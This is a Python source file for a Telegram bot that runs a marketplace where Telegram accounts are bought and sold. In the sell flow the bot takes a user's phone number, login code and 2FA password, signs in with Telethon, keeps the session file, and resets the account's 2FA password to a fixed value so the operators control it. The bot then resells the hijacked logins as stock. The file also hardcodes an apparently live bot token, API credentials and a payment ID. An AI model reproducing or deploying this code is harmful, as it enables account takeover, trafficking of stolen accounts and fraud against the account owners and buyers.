import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tel_types
import asyncio
import os
import threading
from flask import Flask

# --- WEB SERVER (For 24/7 Hosting) ---
app = Flask('')
@app.route('/')
def home(): return "PRIME MASTER BOT ACTIVE"
def run(): app.run(host='0.0.0.0', port=8080)
threading.Thread(target=run, daemon=True).start()

# --- CONFIG ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw'
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
OWNER_ID = 7634311488
LOG_CHANNEL = -1002364843054
CHANNELS = [-1003901746920, -1003897524032]

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- DATABASE ---
db = {
    'users': {}, 
    'admins': [OWNER_ID], 
    'upi': 'abhay-op.315@ptyes',
    'stock': {}, 
    'sell_rates': {}, 
    'buy_rates': {},
}
active_logins = {}

if not os.path.exists('sessions'): os.makedirs('sessions')

# --- HELPERS ---
def is_admin(uid): return uid in db['admins'] or uid == OWNER_ID

def check_join(uid):
    for cid in CHANNELS:
        try:
            m = bot.get_chat_member(cid, uid)
            if m.status in ['left', 'kicked', 'restricted']: return False
        except: return False
    return True

def send_log(text):
    try: bot.send_message(LOG_CHANNEL, f"📝 **SYSTEM LOG**\n\n{text}")
    except: pass

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('💰 BALANCE', '📥 DEPOSIT', '📤 SELL ID', '🛒 BUY ID', '📞 SUPPORT')
    return markup

# --- START & FORCE JOIN ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    
    if not check_join(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 JOIN CHANNEL 1", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
        markup.add(types.InlineKeyboardButton("📢 JOIN CHANNEL 2", url="https://t.me/Team_quorum"))
        markup.add(types.InlineKeyboardButton("✅ CHECK JOIN", callback_data="check_joined"))
        return bot.send_message(message.chat.id, "⚠️ **ACCESS DENIED!**\n\nPlease join both channels to use the bot.", reply_markup=markup)
    
    bot.send_message(message.chat.id, "🔥 **PRIME OTP BOT READY**", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: call.data == "check_joined")
def check_cb(call):
    if check_join(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "✅ Access Granted!", reply_markup=main_menu())
    else:
        bot.answer_callback_query(call.id, "❌ Join both channels first!", show_alert=True)

# --- SELL SYSTEM (ID LOGIN + AUTO 2FA CHANGE) ---
@bot.message_handler(func=lambda m: 'SELL ID' in m.text)
def sell_m(message):
    if not db['sell_rates']: return bot.send_message(message.chat.id, "❌ Selling disabled.")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for c in db['sell_rates']: markup.add(f"SELL {c}")
    markup.add("BACK")
    bot.send_message(message.chat.id, "Select Country:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text.startswith('SELL '))
def sell_init(message):
    country = message.text.split()[1]
    msg = bot.send_message(message.chat.id, f"📞 Enter {country} Number (+...):", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, start_sell_process, country)

def start_sell_process(message, country):
    phone = message.text.strip()
    threading.Thread(target=run_login_thread, args=(message.chat.id, phone, country)).start()

def run_login_thread(chat_id, phone, country):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH, loop=loop)
    try:
        loop.run_until_complete(client.connect())
        req = loop.run_until_complete(client.send_code_request(phone))
        active_logins[chat_id] = {'client': client, 'phone': phone, 'hash': req.phone_code_hash, 'loop': loop, 'country': country}
        bot.send_message(chat_id, "📩 **OTP SENT!** Enter the code:")
        bot.register_next_step_handler_by_chat_id(chat_id, verify_sell_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {str(e)}")

def verify_sell_otp(message):
    otp = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(d['phone'], otp, phone_code_hash=d['hash']))
        finalize_sell(message, d)
    except Exception as e:
        if "password" in str(e).lower():
            bot.send_message(message.chat.id, "🔐 **2FA DETECTED!** Enter current password:")
            bot.register_next_step_handler_by_chat_id(message.chat.id, verify_sell_2fa)
        else: bot.send_message(message.chat.id, "❌ OTP Wrong.")

def verify_sell_2fa(message):
    pwd = message.text.strip()
    d = active_logins.get(message.chat.id)
    try:
        d['loop'].run_until_complete(d['client'].sign_in(password=pwd))
        finalize_sell(message, d)
    except: bot.send_message(message.chat.id, "❌ Wrong Password.")

def finalize_sell(message, d):
    # AUTO CHANGE 2FA TO 2710
    try:
        d['loop'].run_until_complete(d['client'](functions.account.UpdatePasswordSettingsRequest(
            new_settings=tel_types.account.PasswordInputSettings(new_password="2710", hint="dob")
        )))
    except: pass
    
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"sa_{uid}_{d['country']}_{d['phone']}"))
    for a in db['admins']:
        bot.send_message(a, f"📦 **NEW SELL REQ**\nUser: `{uid}`\nNum: `{d['phone']}`\n2FA Updated: `2710`", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ Login Success! 2FA changed to 2710. Wait for payment.")

# --- ADMIN PANEL ---
@bot.message_handler(commands=['admin'])
def admin_p(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, 
        "👑 **ADMIN PANEL**\n\n"
        "📈 `/setbuy INDIA 40` - Set Buy Rate\n"
        "📉 `/setsell INDIA 25` - Set Sell Rate\n"
        "➕ `/addstock INDIA data` - Add Stock (Num:OTP:Pass)\n"
        "📜 `/list` - View Status\n"
        "💳 `/changeupi ID` - Update UPI")

@bot.message_handler(commands=['setbuy', 'setsell', 'addstock', 'list', 'changeupi'])
def admin_logic(message):
    if not is_admin(message.from_user.id): return
    cmd = message.text.split()
    try:
        if '/setbuy' in cmd[0]:
            db['buy_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, "✅ Buy Rate Set.")
        elif '/setsell' in cmd[0]:
            db['sell_rates'][cmd[1].upper()] = int(cmd[2])
            bot.reply_to(message, "✅ Sell Rate Set.")
        elif '/addstock' in cmd[0]:
            c, data = cmd[1].upper(), cmd[2]
            if c not in db['stock']: db['stock'][c] = []
            db['stock'][c].append(data)
            bot.reply_to(message, f"✅ Stock added to {c}.")
        elif '/changeupi' in cmd[0]:
            db['upi'] = cmd[1]
            bot.reply_to(message, "✅ UPI Updated.")
        elif '/list' in cmd[0]:
            res = "📊 **STATUS**\n"
            for c in db['buy_rates']:
                res += f"\n🌍 {c} | Buy: ₹{db['buy_rates'][c]} | Stock: {len(db['stock'].get(c, []))}"
            bot.send_message(message.chat.id, res if db['buy_rates'] else "No data.")
    except: bot.reply_to(message, "❌ Use correct format!")

# --- BUY & DEPOSIT CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def handle_cb(call):
    p = call.data.split('_')
    if p[0] == 'buy':
        c = p[1]
        uid = call.from_user.id
        price = db['buy_rates'].get(c, 0)
        if db['users'].get(uid, {}).get('balance', 0) < price or not db['stock'].get(c):
            return bot.answer_callback_query(call.id, "No Stock/Balance!", show_alert=True)
        data = db['stock'][c].pop(0)
        db['users'][uid]['balance'] -= price
        bot.send_message(uid, f"🛒 **BUY SUCCESS!**\n\nData: `{data}`")
        send_log(f"🛒 **BOUGHT**\nUser: `{uid}`\nCountry: {c}")
    elif p[0] == 'da':
        uid, amt = int(p[1]), int(p[2])
        db['users'][uid]['balance'] += amt
        bot.send_message(uid, f"✅ ₹{amt} added!")
        bot.edit_message_caption("Approved ✅", call.message.chat.id, call.message.message_id)
        send_log(f"💰 **DEPOSIT**\nUser: `{uid}`\nAmt: ₹{amt}")
    elif p[0] == 'sa':
        uid, country, phone = int(p[1]), p[2], p[3]
        rate = db['sell_rates'].get(country, 0)
        db['users'][uid]['balance'] += rate
        bot.send_message(uid, f"✅ ID Paid! ₹{rate} added.")
        bot.edit_message_text(f"Paid ✅", call.message.chat.id, call.message.message_id)

# --- DEPOSIT START ---
@bot.message_handler(func=lambda m: 'DEPOSIT' in m.text)
def dep_start(message):
    msg = bot.send_message(message.chat.id, "💵 Enter amount:")
    bot.register_next_step_handler(msg, dep_utr)

def dep_utr(message):
    try:
        amt = int(message.text)
        bot.send_message(message.chat.id, f"💳 Pay: `{db['upi']}`\nSend 12-digit UTR:")
        bot.register_next_step_handler(message, dep_ss, amt)
    except: bot.send_message(message.chat.id, "❌ Invalid.")

def dep_ss(message, amt):
    utr = message.text.strip()
    bot.send_message(message.chat.id, "📸 Send Screenshot:")
    bot.register_next_step_handler(message, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type != 'photo': return
    uid = message.from_user.id
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ APPROVE", callback_data=f"da_{uid}_{amt}"), types.InlineKeyboardButton("❌ REJECT", callback_data=f"dr_{uid}"))
    for a in db['admins']: bot.send_photo(a, message.photo[-1].file_id, caption=f"🔔 **DEP REQ**\nUser: `{uid}`\nAmt: {amt}\nUTR: {utr}", reply_markup=markup)
    bot.send_message(message.chat.id, "⏳ Sent to admin.")

@bot.message_handler(func=lambda m: 'BUY ID' in m.text)
def buy_menu(message):
    if not db['buy_rates']: return bot.send_message(message.chat.id, "❌ No stock.")
    markup = types.InlineKeyboardMarkup()
    for c, p in db['buy_rates'].items():
        markup.add(types.InlineKeyboardButton(f"{c} - ₹{p}", callback_data=f"buy_{c}"))
    bot.send_message(message.chat.id, "Select country:", reply_markup=markup)

@bot.message_handler(func=lambda m: 'BALANCE' in m.text)
def bal(message):
    b = db['users'].get(message.from_user.id, {}).get('balance', 0)
    bot.send_message(message.chat.id, f"💳 Balance: ₹{b}")

@bot.message_handler(func=lambda m: 'SUPPORT' in m.text)
def sup(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👤 OWNER", url="https://t.me/god_abhay"), types.InlineKeyboardButton("📢 SUPPORT", url="https://t.me/PRIME_OTP_SUPPORT_GROUP"))
    bot.send_message(message.chat.id, "Support:", reply_markup=markup)

bot.polling(none_stop=True)
